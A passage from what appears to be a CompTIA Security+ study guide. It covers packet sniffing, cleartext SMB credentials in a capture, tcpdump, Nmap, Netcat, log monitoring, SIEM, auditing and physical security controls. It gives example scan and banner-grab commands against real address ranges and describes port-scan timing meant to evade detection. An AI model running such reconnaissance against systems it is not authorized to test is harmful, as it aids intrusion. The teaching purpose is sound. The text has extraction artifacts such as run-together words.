Figure 8.3 shows Wireshark after it captured packets transmitted over the network. It includes about 150 packets and has packet 121 selected in the top pane. The top pane shows the source and destination IP addresses and the Server Message Block (SMB) protocol. Many networks use SMB to send files over the network, and this packet includes the contents of that file. The middle pane shows details from this packet with the Internet Protocol version 4 header information partially expanded. The bottom pane shows the entire contents of the packet
(including the unencrypted credentials) displayed in hexadecimal and ASCII characters.
  Figure 8.3: Wireshark capture
Although it can be tedious to analyze a packet capture, there is a lot of information in it for anyone willing to take the time to do so. Occasionally, attackers manipulate flags (arrow 1) within the headers for different types of attacks, and the protocol analyzer allows you to verify header manipulation attacks. You can also see the source and destination IP addresses (arrow 2) within the IP header field. You can expand the Ethernet II section to show the media access control (MAC) addresses of the source and destination computers.
Notice that you can view the unencrypted credentials—username (Darril) and password (P@ssw0rd)—in the bottom pane (arrow 3) because SMB sends it in cleartext. However, if an application encrypted the data before sending it across the network, it would not be readable.
Although this packet capture only includes about 150 packets, a packet capture can easily include thousands of packets. Wireshark includes filters that administrators use to focus on specific types of traffic. These filters also allow them to quantify the traffic. example, they can determine the percentage of SMTP traffic or HTTP traffic on the network.
In addition to seeing a capture using the Wireshark graphical interface, you can also view them as text files. The information in the text file is usually limited using filters, but normally includes the time, source information labeled as src, destination information labeled as dst, and sometimes protocol information. Here’s an example:
22:33:44, src 192.168.5.55:3389, dst 192.168.7.17:8080,
syn/ack
The time is shown in a 24-hour clock as 10:33 p.m. and 44 seconds.
Notice the source and destination includes an IP address and a port number. This reiterates the importance of knowing commonly used ports mentioned in Chapter 3. It also shows you how you can identify the source of traffic. example, if an attacker is manipulating or fragmenting packets as part of an attack, you can use the src IP address to identify the potential source of the attack.
It’s worth noting that the source IP address doesn’t always identify the actual attacker. example, attackers often take control of other computers and launch attacks from them without
the knowledge of the owner. Similarly, Port Address Translation (PAT) translates public and private IP addresses. If the traffic goes through a device using PAT, the protocol analyzer only captures the translated IP address, not the original IP address.
When using a protocol analyzer, you need to configure the network interface card (NIC) on the system to use promiscuous mode. Normally, a NIC uses non-promiscuous mode and only processes packets addressed directly to its IP address. However, when you put it in promiscuous mode, it processes all packets regardless of the IP address. This allows the protocol analyzer to capture all packets that reach the NIC.
 Command-Line Tools
Chapter 1 introduces some command-line tools available on Windows and Linux systems. Some tools are useful when performing vulnerability scans and penetration tests. Three tools discussed in this section are tcpdump, Nmap, and Netcat.
As with any command-line tools, it’s best to dig in and give them a try. I strongly encourage you to check out the free online labs at http:// gcgapremium.com/501labs/ and do each of them.
Tcpdump
Tcpdump is a command-line packet analyzer (or protocol analyzer). It allows you to capture packets like you can with Wireshark (mentioned in the “Sniffing with a Protocol Analyzer” section). The difference is that Wireshark is a Windows-based tool and tcpdump is executed from the command line. Many administrators use tcpdump to capture the packets and later use Wireshark to analyze the packet capture. One of the online labsfor this chapter shows how to do this.
Kali Linux includes tcpdump, but you won’t find it on Windows systems. As with most Linux command-line tools, tcpdump is case sensitive. You need to enter tcpdump in all lowercase. Additionally, the switches must be entered with the proper case. example, -c (lowercase c) represents count and indicates the capture should stop after receiving the specified number of packets. However, -C (uppercase C) represents file size and indicates the maximum size (in millions of bytes) of a packet capture. When the file reaches this size, tcpdump closes it and starts storing packets in a new file.
Nmap
Nmap is a network scanner and was discussed earlier in the “Network Scanners” section. The graphical side of Nmap is Zenmap, and Figure 8.1 showed a screenshot from Zenmap. Additionally, online labs show you how to install and use Nmap and Zenmap.
It includes many capabilities, including identifying all the active hosts and their IP addresses in a network, the protocols and services running on each of these hosts, and the operating
 system of the host. When running the command, you include the scan type(s), optional options, and target specifications. example, consider the following command:
nmap -T4 -A -v 192.168.0.0/24
Notice that it has three switches, -T4, -A, and -v:
T4. T4 refers to the speed of the scan. Valid switches are T0 through T5
with T0 being the slowest and T5 being the fastest. Faster scans are likely to be detected, while slower scans may not be detected.
A. The -A switch indicates the scan should include OS detection, version detection, script scanning, and traceroute.
-v. The -v switch indicates the verbosity level. You can get more data output by using
-vv or -vvv.
Netcat
Chapter 3 discusses Netcat and how administrators often use it for remotely accessing Linux systems. It doesn’t include native encryption so i t’s common to use SSH to secure the session. Additionally, the“Banner Grabbing” section earlier in this chapter mentioned that Netcat can easily be used for banner grabbing. The following is a sample command used for banner grabbing:
echo “” | nc -vv -n -w1 72.52.206.134 80
It uses the netcat command (nc) along with some switches: -vv for a verbose output, -n to not resolve host names, -w1 to wait no more than 1 second for a reply. The command connects to port 80 of the system with an IP address of 72.52.206.134. The echo “” sends a blank command to the server and the pipe symbol ( | ) tells Netcat to send the command after establishing the connection.
Some other uses of Netcat include:
Transferring files. One of the online labs for Chapter 3 shows how to
create a chat session between two systems. Once this session is open, you can use the connection to copy files between the systems.
-  Port scanner. You can use Netcat to run a port scan against a single IP address. It allows you to specify the range of ports, such as 10 through 1024 and randomize the ports scanned to evade detection. It also supports waiting longer periods of time between port checks, again, to evade detection.
Monitoring Logs for Event Anomalies
Logs have the capability to record what happened, when it happened, where it happened, and who did it. One of the primary purposes of logging is to allow someone, such as an administrator or security professional, to identify exactly what happened and when.
Many times, security administrators are searching the logs looking for event anomalies. As a
simple example, attackers sometimes try to log on to accounts by guessing passwords. Security logs will record these attempts as failed logons, which is an event anomaly. After investigating the failed logons, administrators can determine if the failed logons were part of normal operation, or a security incident.
It’s tempting to set up logging to record every event and provide as much detail as possible—most logs support a verbose mode that will log additional details. However, a limiting factor is the amount of disk space available. Additionally, when logging is enabled, there is an implied responsibility to review the logs. The more you choose to log, the more you may have to review. The goal is to strike a balance between what is needed and the amount of available space for storage. The following sections cover some commonly used logs.
Operating System Event Logs
Operating systems have basic logs that record events. example, Windows systems have several common logs that record what happened on a Windows computer system. These logs are viewable using the Windows Event Viewer. One of the primary logs in a Windows system is the Security log and it functions as a security log, an audit log, and an access log.
The Security log records auditable events, such as when a user logs on or off, or when a user accesses a resource. Some auditing is enabled by default in some systems, but administrators can add additional auditing. The Security log records audited events as successes or failures. Success indicates an audited event completed successfully, such as a user successfully logging on or successfully deleting a file. Failure indicates that a user tried to perform an action but failed, such as failing to log on or trying to delete a file but receiving a permission error instead. Some additional logs in a Windows system include:
Application. The Application log records events recorded by applications or programs running on the system. Any application has the capability of recording errors in the Application log.
System. The operating system uses the System log to record events related to the functioning of the operating system. This can include when it starts, when it shuts down, information on services
starting and stopping, drivers loading or failing, or any other system
component event deemed important by the system developers.
If a system is attacked, you may be able to learn details of the attack by reviewing the operating system logs. Depending on the type of attack, any of the
operating system logs may beuseful.
Firewall and Router Access Logs
You can typically manipulate firewalls and routers to log specific information, such as logging all traffic that the device passes, all traffic that the device blocks, or both. These logs are useful when troubleshooting connectivity issues and when identifying potential intrusions or attacks.
Firewall and router logs include information on where the packet came from (the source) and where it is going (the destination). This includes IP addresses, MAC addresses, and ports.
Linux Logs
The CompTIA Security+ exam includes several Linux-based commands. Understanding this, it’s valuable to know about some common Linux logs. You can view logs using the System Log Viewer on Linux systems or by using the cat command from the terminal. example, to view the authentication log (auth.log), you can use the following command:
cat /var/log/auth.log
Some of the Linux logs administrators often look at include: var/log/messages. This log contains a wide variety of general system messages. It includes some messages logged during startup, some messages related to mail, the kernel, and messages related to authentication. It stores general system activity log entries. var/log/boot.log. Log entries created when the system boots are contained here.
var/log/auth.log. The authentication log contains information related to successful and unsuccessful logins.
var/log/faillog. This log contains information on failed login attempts. It can be viewed using the faillog command.
/var/log/kern.log. The kernel log contains information logged by the system kernel, which is the central part of the Linux operating system. /var/log/httpd/. If the system is configured as an Apache web server, you can view access and error logs with this directory.
Some Linux distributions include the utmp, wtmp, and btmp files (or the utmpx, wtmpx, and btmpx variants). They are created so that administrators can answer questions such as who is currently logged in, who has logged in recently, and what accounts have failed login attempts. They are typically within the /var/log folder but might be elsewhere. The following bullets describe these files:
The utmp file maintains information on the current status of the system, including who is currently logged in. The who command queries this file to display a list of users currently logged in.
The wtmp file is an archive of the utmp file. Depending on how it is implemented, it can be a circular file, overwriting itself when it reaches a predetermined size. The last command queries this file to show the last logged-in users.
The btmp file records failed login attempts. The lastb command shows the last failed login attempts.
Other Logs
In addition to the basic operating system logs and firewall and router access logs, administrators use other logs when maintaining systems and networks. These include:
Antivirus logs. Antivirus logs log all antivirus activity, including when scans were run and if any malware was detected. These logs also identify if malware was removed orquarantined.
Application logs. Many server applications include logging capabilities within the application. example, database applications such as Microsoft SQL Server or Oracle Database include logs to record performance and user activity.
Performance logs. Performance logs can monitor system performance and give an alert when preset performance thresholds are exceeded.
 SIEM
A security information and event management (SIEM) system provides a centralized solution for collecting, analyzing, and managing data from multiple sources. They combine the services of security event management (SEM) and security information management (SIM) solutions. A SEM provides real-time monitoring, analysis, and notification of security events, such as suspected security incidents. A SIM provides long-term storage of data, along with methods of analyzing the data looking for trends, or creating reports needed to verify compliance of laws or regulations.
SIEMs are very useful in large enterprises that have massive amounts of data and activity to monitor. Consider an organization with over 1,000 servers. When an incident occurs on just one of those servers, administrators need to know about it as quickly as possible. The SIEM provides continuous monitoring and provides real-time reporting. example, in a large network operations center (NOC), the SIEM might display alerts on a large heads-up display. A benefit is that the monitoring and reporting is automated with scripts with the SIEM.
Vendors sell SIEMs as applications that can be installed on systems, and as dedicated hardware appliances. However, no matter how a vendor bundles it, it will typically have common capabilities. This starts with a database that can be easily searched and analyzed. The SIEM collects log data from devices throughout the network and stores these logs in the database.
The following bullets outline some additional capabilities shared by most SIEMs:
Aggregation. Aggregation refers to combining several dissimilar items into a single item. A SIEM can collect data from multiple sources, such as firewalls, intrusion detection systems, proxy servers, and more. Each of these devices formats the logs differently. However, the SIEM can aggregate the data and store it in such a way that it is easy to analyze and search.
Correlation engine. A correlation engine is a software component used to collect and analyze event log data from various systems within the network. It typically aggregates the data looking for common attributes. It then uses advanced analytic tools to detect patterns of
potential security events and raises alerts. System administrators can then investigate the alert.
Automated alerting. A SIEM typically comes with predefined alerts, which provide notifications of suspicious events. example, if it detects a port scan on a server, it might send an email to an administrator group or display the alert on a heads-up display.SIEMs also include the ability to create new alerts.
Automated triggers. Triggers cause an action in response to a predefined number of repeated events. example, imagine a trigger for failed logons is set at five. If an attacker repeatedly tries to log on to a server using Secure Shell (SSH), the server’s log will show the failed logon attempts. When the SIEM detects more than five failed SSH logons, it can change the environment and stop the attack. It might modify a firewall to block these SSH logon attempts or send a script to the server to temporarily disable SSH. A SIEM includes the ability to modify predefined triggers and create new ones.
Time synchronization. All servers sending data to the SIEM should be synchronized with the same time. This becomes especially important when investigating an incident so that security investigators know when events occurred. Additionally, large organizations can have locations in different time zones. Each of these locations might have servers sending data to a single centralized SIEM. If the server logs use their local time, the SIEM needs to ensure that it compensates for the time offset. One method
is to convert all times to Greenwich Mean Time (GMT), which is the time at the Royal Observatory in Greenwich,London.
Event deduplication. Deduplication is the process of removing duplicate entries. example, imagine 10 users receive the same email and choose to save it. An email server using deduplication processing will keep only one copy of this email, but make it accessible to all 10 users. Imagine a NIDS collects data from a firewall and a SIEM collects data from the NIDS and the firewall. The SIEM will store only a single copy of any duplicate log entries, but also ensure that the entries are associated with both devices.
Logs/WORM. A SIEM typically includes methods to prevent anyone from modifying log entries. This is sometimes referred to as write once read many (WORM). As logs are received, the SIEM will aggregate and correlate the log entries. After processing the logs, it can archive the source logs with write protection.
The location of the SIEM (and the location of its correlation engine) varies based on how the SIEM is used. However, it’s common to locate the SIEM within the private network, even if it is collecting some data from the demilitarized zone (DMZ). The internal network will provide the best protection for the log data. In very large organizations, aggregation processes and the correlation engine can consume a lot of processing power, so organizations sometimes off-load these processes to another server. The primary SIEM appliance can then focus on alerts and triggers.
Continuous Monitoring
I t ’s important to realize that there is never a time that security professionals can say, “Now that we’ve implemented this security measure, we can sit back knowing that we’re safe.” In other words, security is never finished. Instead, security professionals must continuously monitor their environment for emerging threats and new vulnerabilities.  Continuous security monitoring includes monitoring all relevant security controls, with the goal of ensuring that they help an organization maintain a strong security posture. There are many methods of monitoring, including performing periodic threat assessments, vulnerability assessments, and risk assessments. Many organizations perform routine vulnerability scans, such as once a week, and infrequent penetration tests. Additionally, organizations perform routine audits and reviews, such as usage auditing reviews and permission auditing reviews, which are discussed in the next section.
Usage Auditing and Reviews
Usage auditing refers to logging information on what users do. example, if Homer accesses a file on a network server, the log entry would show his identity, when he accessed the file, what file he accessed, and what computer he used to access the file. He would not be able to refute the recorded action because auditing provides non-repudiation.  Auditing can include much more than when a user accessed a file. It can also include when a user logs on, accesses a network share, reads a file, modifies a file, creates a file, prints a file, accesses a web site via a proxy server, and much more.
Configuring logging of logon attempts is an important security step for system monitoring. After configuring logging, a system records the time and date when users log on, and when they access systems within a network. When users first log on to their account, i t’s recorded as a logon action. Additionally, when users access a resource over the network (such as a file server), it is also recorded as a logon action. Many systems utilize single sign-on (SSO), so users don’t have to provide their credentials again. However, their access is still recorded as a logon action.
A usage auditing review looks at the logs to see what users are doing. example, an organization might have a network share filled with files on a proprietary project. A usage auditing review might look at audit logs for these files to see who is accessing the files and what they are doing with the files.
Logs create an audit trail of what happened. Usage auditing reviews are often done to re- create the audit trail, or reconstruct what happened in the past. example, if someone leaks proprietary information outside the organization, investigators can look at the auditing files to see who accessed the
information, what they did with it (such as printing it), and when they did so. Permission Auditing and Review
A permission auditing review looks at the rights and permissions assigned to users and helps ensure the principle of least privilege is enforced. Chapter 2, “Understanding Identity and Access Management,” discusses the principle of least privilege in more depth, but in short it simply means that users have the rights and permissions they need, but no more. This includes ensuring users can access only the resources they need to perform their job.
Permission auditing reviews identify the privileges (rights and permissions) granted to users, and compares them against what the users need. It can detect privilege creep, a common problem that violates the principle of least privilege.
Privilege creep (or permission bloat) occurs when a user is granted more and more privileges due to changing job requirements, but unneeded privileges are never removed. example, imagine Lisa is working in the Human Resources (HR) department, so she has access to HR data. Later, she transfers to the Sales department and administrators grant her access to sales data. However, no one removes her access to HR data even though she doesn’t need it to perform her job in the Sales department.
Organizationscommonlyusearole-basedaccesscontrolmodelwithgroup- basedprivileges, as described in Chapter 2. example, while Lisa is working in the HR department, her account would be in appropriate HR department security groups to grant her appropriate privileges for the HR job. When she transfers to the Sales department, administrators would add her to the appropriate Sales department groups, granting her privileges for her new job. An organization should also have account management controls in place to ensure that administrators remove her account from the HR department security groups. The permission auditing review verifies that these account management practices are followed.
Most organizations ensure that permission auditing reviews are performed at least once a year, and some organizations perform them more often. The goal is to do them often enough to catch potential problems and prevent security incidents. However, unless they can be automated, they become an unnecessary burden if security administrators are required to do them too often, such as daily or even once a week.
  Implementing Controls to Protect
Assets
CompTIA Security+ objectives covered in this chapter:
1.2 1.6
Compare and contrast types ofattacks.
Social engineering (Tailgating)
Explain the impact associated with types of vulnerabilities.
Vulnerablebusinessprocesses,Systemsprawl/undocumented assets, Architecture/ design weaknesses
2.1 Install and configure network components, both hardware- and software-based, to support organizational security.
Load balancer (Scheduling [Affinity, Round-robin], Active- passive, Active-active, Virtual IPs)
2.2 Given a scenario, use appropriate software tools to assess the security posture of an organization.
Backup utilities
Given a scenario, troubleshoot common security issues.
Asset management
3.1 Explain use cases and purpose for frameworks, best practices and secure configuration guides.
Defense-in-depth/layered security (Vendor diversity, Control
diversity [Administrative, Technical], User training)
Explain how resiliency and automation strategies reduce risk.
Distributiveallocation,Redundancy,Faulttolerance,High availability, RAID
2.3
3.8 3.9 Explain the importance of physical security controls.
Lighting, Signs, Fencing/gate/cage, Security guards, Alarms, Safe, Secure cabinets/ enclosures, Protected distribution/Protected cabling, Airgap, Mantrap, Faraday cage, Lock
types, Biometrics, Barricades/bollards, Tokens/cards, Environmental controls (HVAC, Hot and cold aisles, Fire suppression), Cable locks, Cameras, Motion detection, Logs, Infrared detection, Key management
4.3 Given a scenario, implement identity and access management controls.
5.2
5.6
Physical access control (Proximity cards, Smart cards)
Summarize business impact analysis concepts.
RTO/RPO, MTBF, MTTR, Mission-essential functions, Identification of critical systems, Single point of failure, Impact (Life, Property, Safety, Finance, Reputation), Privacy impact assessment, Privacy threshold assessment
Explain disaster recovery and continuity of operation concepts.
Recovery sites (Hot site, Warm site, Cold site), Order of restoration, Backup concepts (Differential, Incremental, Snapshots, Full), Geographic considerations (Off-site backups, Distance, Location selection, Legal implications, Data sovereignty), Continuity of operation planning (Exercises/tabletop, After-action reports, Failover, Alternate processing sites, Alternate business practices)
**
You can’t eliminate risk to an organization’s assets. However, you can
reduce the impact of many threats by implementing security controls. It’s common to implement several controls using a defense-in-depth strategy. Physical security controls help protect access to secure areas. Redundancy and fault-tolerance strategies help eliminate single points of failure for critical systems. Backups ensure that data remains available even after data is lost. More in-depth business continuity strategies help ensure mission-critical functions continue to operate even if a disaster destroys a primary business location. This chapter covers these concepts.
Implementing Defense in Depth Defense in depth (also known as layered security) refers to the security practice of implementing several layers of protection. You can’t simply take a
single action, such as implementing a firewall or installing antivirus software, and consider yourself protected. You must implement security at several different layers. This way, if one layer fails, you still have additional layers to protect you.
If you drive your car to a local Walmart, put a five-dollar bill on the dash, and leave the keys in the car and the car running, there is a very good chance the car won’t be there when you come out of the store. On the other hand, if you ensure nothing of value is visible from the windows, the car is locked, it has an alarm system, and it has stickers on the windows advertising the alarm system, it’s less likely that someone will steal it. Not impossible, but less likely.
You’ve probably heard this as “there is no silver bullet.” If you want to kill a werewolf, you can load your gun with a single silver bullet and it will find its mark. The truth is that there is no such thing as a silver bullet. (Of course, there is no such thing as a werewolf either.)
Applied to computers, it’s important to implement security at every step, every phase, and every layer. Information technology (IT) professionals can never rest on their laurels with the thought they have done enough and no longer need to worry about security.
Control diversity is the use of different security control types, such as technical controls, administrative controls, and physical controls. example, technical security controls such as firewalls, intrusion detection systems (IDSs), and proxy servers help protect a network. Physical security controls can provide extra protection for the server room or other areas where these
devices are located. Administrative controls such as vulnerability assessments and penetration tests can help verify that these controls are working as expected.
 Vendor diversity is the practice of implementing security controls from different vendors to increase security. example, Chapter 3, “Exploring Network Technologies and Tools,” describes a demilitarized zone (DMZ). Many DMZs use two firewalls and vendor diversity dictates the use of firewalls from different vendors. example, one firewall could be a Cisco firewall and the other one could be a Check Point firewall. If a vulnerability is discovered in one of these firewalls, an attacker might be able to exploit it. However, it’s unlikely that both firewalls would develop a vulnerability at the same time.
User training also helps provide defense in depth. If users engage in risky behaviors, such as downloading and installing files from unknown sources or responding to phishing emails, they can give attackers a path into an organization’s network. However, providing regular training to users on common threats, and emerging
threats, helps them avoid these types of attacks.
Comparing Physical Security Controls
A physical security control is something you can physically touch, such as a hardware lock, a fence, an identification badge, and a security camera. Physical security access controls attempt to control entry and exits, and organizations commonly implement different controls at different boundaries, such as the following:
Perimeter. Military bases and many other organizations erect a fence around the entire perimeter of their land. They often post security guards at gates to control access. In some cases, organizations
install barricades to block vehicles.
Buildings. Buildings commonly have additional controls for both safety and security. example, guards and locked doors restrict entry so only authorized personnel enter. Many buildings include lighting and video cameras to monitor the entrances and exits.
Secure work areas. Some companies restrict access to specific work areas when employees perform classified or restricted access tasks. In some cases, an organization restricts access to all internal work areas. In other words, visitors can enter the lobby of a building, but they are not able to enter internal work areas without an escort.
Server and network rooms. Servers and network devices such as routers and switches are normally stored in areas where only the appropriate IT personnel can access them. These spaces may be designated as server rooms or wiring closets. I t ’s common for an organization to provide additional physical security for these rooms to prevent attackers from accessing the equipment. example, locking a wiring closet prevents an attacker from installing illicit monitoring hardware, such as a protocol analyzer, to capture network traffic.
Hardware. Additional physical security controls protect individual systems. example, server rooms often have locking cabinets to protect servers and other equipment
installed in the equipment bays. Cable locks protect laptop computers, and smaller devices can be stored in safes.
Airgap. An airgap is a physical security control that ensures that a computer or network is physically isolated from another computer or network. example, you can isolate a computer from a network by ensuring that it is not connected to any other system in the network. This lack of connectivity provides an airgap. This is often done to separate classified networks from unclassifiednetworks.
Using Signs
A simple physical security control is a sign. F o r example, an “Authorized Personnel Only” sign will deter many people from entering a restricted area. Similarly, “No Trespassing” signs let people know they shouldn’t enter. Of course, these signs won’t deter everyone, so an organization typically uses additional physical security measures.
Comparing Door Lock Types
It’s common to secure access to controlled areas of a building with door locks, and there are many different lock types. A door access system is one that only opens after some access control mechanism is used. Some common door access systems are cipher locks, proximity cards, and biometrics.
When implementing door access systems, i t’s important to limit the number of entry and exit points. example, if a data center has only one entrance and exit, it is much easier to monitor this single access point. You can control it with door locks, video surveillance, and guards. On the other hand, if the data center has two entry/exit points, you need another set of controls to control access in both places.
Another important consideration with door access systems is related to personnel safety and fire. In the event of a fire, door access systems should allow personnel to exit the building without any form of authentication.
Securing Door Access with Cipher Locks
Cipher locks often have four or five buttons labeled with numbers. Employees press the numbers in a certain order to unlock the door. example, the cipher code could be 1, 3, 2, 4. Users enter the code in the correct order to gain access. Cipher locks can be electronic or manual. An electronic cipher lock automatically unlocks the door after you enter the correct code into the keypad. A manual cipher lock requires the user to turn a handle after entering the code.
To add complexity and reduce brute force attacks, many manual cipher locks include a code that requires two numbers entered at the same time. Instead of just 1, 3, 2, 4, the code could be 1/3 (entered at the same time), then 2, 4, 5.
One challenge with cipher locks is that they don’t identify the users. Further, uneducated
users can give out the cipher code to unauthorized individuals without understanding the risks. Shoulder surfers might attempt to discover the code by watching users as they enter. Security awareness training can help reduce these risks.
 Securing Door Access with Cards
It’s also possible to secure access to areas with proximity cards or smart cards. Proximity cards are small credit card-sized cards that activate when they are in close proximity to a card reader. Many organizations use these for access points, such as the entry to a building or the entry to a controlled area within a building. The door uses an electronic lock that only unlocks when the user passes the proximity card in front of a card reader.
Similarly, it’s possible to use smart cards or physical tokens (described in Chapter 2, “Understanding Identity and Access Management”) for door access. In some scenarios, the smart cards include proximity card electronics. In other scenarios, users must insert the smart card into a smart card reader to gain access.
You’ve probably seen proximity card readers implemented with credit card readers. Many self-serve gasoline stations and fast-food restaurants use them. Instead of swiping your credit card through a magnetic reader, you simply pass it in front of the reader (in close proximity to the reader), and the reader extracts your credit card’s information.
These are becoming popular elsewhere, too. example, if you stay at a Walt Disney World property, they can issue you a bracelet that includes the functionality of a proximity card. To enter your hotel room, you wave your bracelet in front of the door. If you want to buy food or souvenirs or pay for almost anything, you can simply wave your bracelet in front of a card reader to complete your purchase.
The card (and bracelet) doesn’t require its own power source. Instead, the electronics in the card include a capacitor and a coil that can accept a charge from the proximity card reader. When you pass the card close to the reader, the reader excites the coil and stores a charge in the capacitor. Once charged, the card transmits the information to the reader using a radio frequency. When used with door access systems, the proximity card can send just a simple signal to unlock the door. Some systems include details on the
user and record when the user enters or exits the area. When used this way, it’s common to combine the proximity card reader with a keypad requiring the user to enter a personal identification number (PIN). This identifies and authenticates the user with multifactor authentication. The user has something (the proximity
card) and knows something (a PIN). Many organizations use proximity cards with turnstiles to provide access for a single person at a time. These are the same type of turnstiles used as entry gates in subways, stadiums, and amusementparks.
Securing Door Access with Biometrics
It’s also possible to use biometric methods as an access control system. One of the benefits is that some biometric methods provide both identification and authentication. When connected
to a back-end database, these systems can easily record the activity, such as who entered the area and when.
example, you can install a retina scanner at the entrance to a secure server room. When individuals want to enter, the biometric scanner identifies and authenticates them. It’s important to ensure you use an accurate biometric system and configure it to use a low false acceptance rate, as described in Chapter 2. Otherwise, it might falsely identify unauthorized individuals and grant them access.
Tailgating
Chapter 6, “Comparing Threats, Vulnerabilities, and Common Attacks,” discusses several types of social engineering attacks and tailgating is another one. Tailgating (also called piggybacking) occurs when one user follows closely behind another user without using credentials. example, if Lisa opens a
 door with her proximity card and Bart follows closely behind her without using a proximity card, Bart is tailgating. If authorized users routinely do this, it indicates the environment is susceptible to a social engineering attack where an unauthorized user follows closely behind an authorized user.
example, an organization hired a security company to perform a vulnerability assessment. The company sent one of its top security professionals (who happened to be an attractive woman) to see if she could get into the building. She saw that employees were using proximity cards to get into the building, but she didn’t have one. Instead, she loaded herself up with a book bag and a laptop—ensuring her hands weren’t free. She timed her approach carefully and followed closely behind an employee with a proximity card. She flashed a friendly smile, and sure enough, the employee held the door open for her.
Most of us learn to be polite and courteous and social engineers take advantage of this. It’s polite to hold a door open for people who have their
hands full. In contrast, it’s rude to slam the door in the face of someone following behind us. However, most users don’t want to help criminals. Security awareness programs and training help users understand how criminals use tactics such as tailgating. Educated users are less likely to be tricked, even by a friendly smile from an attractive woman.
High-traffic areas are most susceptible to tailgating attacks. Security guards can be an effective preventive measure at access points, but they need to be vigilant to ensure that tailgating does not occur. The best solution is a mantrap.
Preventing Tailgating with Mantraps
A mantrap is a physical security mechanism designed to control access to a secure area through a buffer zone. Personnel use something like a proximity card to gain access, and the mantrap allows one person, and only one person, to pass through. Because they only allow one person through at a time, mantraps prevent tailgating. Mantraps get their name due to their
ability to lock a person between two areas, such as an open access area and a secure access area, but not all of them are that sophisticated.
An example of a simple mantrap is a turnstile similar to what you see in many public transport systems. Even if you’ve never ridden the subway in one of many U.S. cities or the Tube in London, you’ve probably seen turnstiles in movies such as While You Were Sleeping. When customers present a token, the turnstile unlocks and allows a single person through at a time. Similarly, users unlock the turnstile mantrap with something like a proximity card.
A sophisticated mantrap is a room, or even a building, that creates a large buffer area between the secure area and the unsecured area. Access through the entry door and the exit door is tightly controlled, either with guards or with an access card such as a proximitycard.
It’s also possible to require identification and authentication before allowing
passage through a mantrap. Forexample, a retina scanner can identify individuals and restrict access to only authorized individuals. Similarly, some card reader systems support the use of unique PINs assigned to the user. Users present their card and enter their PIN to gain access before the mantrap opens.
Increasing Physical Security with Guards
Many organizations use security guards to control access to buildings and secure spaces. If employees have ID badges, guards can check these badges prior to granting the employees access. Even if ID badges aren’t used, guards can still verify people’s identity using other identification. Similarly, the security guards can restrict access by checking people’s identity against a preapproved access control list. In some cases, guards record all access in an access log. Security guards can also take a less-active role to deter security
incidents. example, a
 security guard can deter tailgating incidents by observing personnel when they use their proximity card to gain access to a secure area.
Monitoring Areas with Cameras
Organizations are increasingly using security cameras in the workplace and surrounding areas for video surveillance. This includes areas outside of a building, such as a parking lot, and all building entrances and exits. Additionally, many organizations use cameras to monitor internal entrances of high-security areas, such as the entrance of a data center or server room.
Cameras are connected to a closed-circuit television (CCTV) system, which transmits signals from video cameras to monitors that are similar to TVs. In addition to providing security, CCTV can also enhance safety by deterring threats.
Organizations often use video cameras within a work environment to protect employees and enhance security in the workplace. In addition to live monitoring, most systems include a recording element, and they can verify if someone is stealing the company’s assets. By recording activity, videos can be played back later for investigation and even prosecution.
Video surveillance provides the most reliable proof of a person’s location and activity.
Access logs provide a record, but it’s possible to circumvent the security of an access log. example, if Bart used your proximity card to gain access to a secure space, the log will indicate you entered, not Bart. In contrast, if the video shows that Bart entered the room at a certain time of day, it’s not easy for Bart to refute the video.
When using video surveillance in a work environment, it’s important to respect privacy and to be aware of privacy laws. Some things to consider are:
Only record activity in public areas. People have a reasonable expectation of privacy in certain areas, such as locker rooms and
 restrooms, and it is often illegal to record activity in these areas.
Notify employees of the surveillance. If employees aren’t notified of the surveillance, legal issues related to the video surveillance can arise. This is especially true if the recordings are used when taking legal and/ or disciplinary actions against an employee.
Do not record audio. Recording audio is illegal in many jurisdictions, without the express consent of all parties being recorded. Many companies won’t even sell surveillance cameras that record audio.
Fencing, Lighting, and Alarms
Fences provide a barrier around a property and deter people from entering. When using a fence, it’s common to control access to the area via specific gates. Guards often monitor these gates and ensure only authorized individuals can enter. When additional security is required, organizations sometimes configure dual gates, allowing access into one area where credentials are checked before allowing full access. This effectively creates a cage preventing full access, but also prevents unauthorized individuals from escaping.
Installing lights at all the entrances to a building can deter attackers
from trying to break in. Similarly, lighting at the entrances of any internal restricted areas can deter people from trying to enter. Many organizations use a combination of automation, light dimmers, and motion sensors to save on electricity costs without sacrificing security. The lights automatically turn on at dusk, but in a low, dimmed mode. When the motion sensors detect any movement, the lights turn on at full capacity. They automatically turn off at dawn.
It’s important to protect the lights. example, if an attacker can remove the light bulbs, it defeats the control. Either place the lights high enough so that they can’t be easily reached, or protect them with a metal cage.
Alarms provide an additional physical security protection. This includes alarms that detect fire and alarms that detect unauthorized access. Fire alarms detect smoke and/or heat and trigger fire suppression systems. Burglary prevention systems monitor entry points such as doors and windows, detecting when someone opens them.
Y o u can also combine motion detection systems with burglary prevention systems. They detect movement within monitored areas and trigger alarms. Obviously, you wouldn’t have motion detection systems turned on all the time. Instead, you’d turn them on when people will not be working in the area, such as during nights or weekends.
 You might have noticed that fencing, lighting, and alarms can all be combined with motion detection. At the most basic level, motion detection methods detect moving objects. Many motion detectors use microwave technologies to detect movement. This is like the technology used in some police radar speed guns.
A more advanced method is infrared detection. Infrared detectors sense infrared radiation, sometimes called infrared light, which effectively sees a difference between objects of different temperatures. example, a person is much warmer than objects in a room and easily stands out using an infrared detector. This can help eliminate false alarms by sensing more than just motion, but motion from
objects of differenttemperatures.
Securing Access with Barricades
In some situations, fencing isn’t enough to deter potential attackers. To augment fences and other physical security measures, organizations erect stronger barricades. example, military bases often erect strong, zigzag barricades that require vehicles to slow down to navigate through them. This prevents attackers from trying to ram through the gates.
Businesses and organizations need to present an inviting appearance, so they can’t use such drastic barricades. However, they often use bollards, which are short vertical posts, composed of reinforced concrete and/or steel. They often place the bollards in front of entrances about three or four feet apart. They typically paint them with colors that match their store. You’ve probably walked through a set of bollards multiple times without giving them a second thought. However, thieves who are contemplating driving a car or truck through the entrance see them.
Many thieves have driven vehicles right through the front of buildings, and then proceeded to steal everything in sight. Depending on the strength of the walls, criminals might even be able to drive through a wall with a truck. Strategically placed bollards will prevent these types of attacks.
Using Hardware Locks
You can implement simple physical security measures to prevent access to secure areas. example, you can use hardware locks—similar to what you use to secure your home—to secure buildings as well as rooms within buildings. Companies that don’t have the resources to employ advanced security systems often use these types of hardware locks.
Instead of allowing free access to wiring closets or small server rooms, small organizations use these types of locks to restrict access. Although these locks aren’t as sophisticated as the ones used by large organizations, they are much better than leaving the rooms open and the equipment exposed.
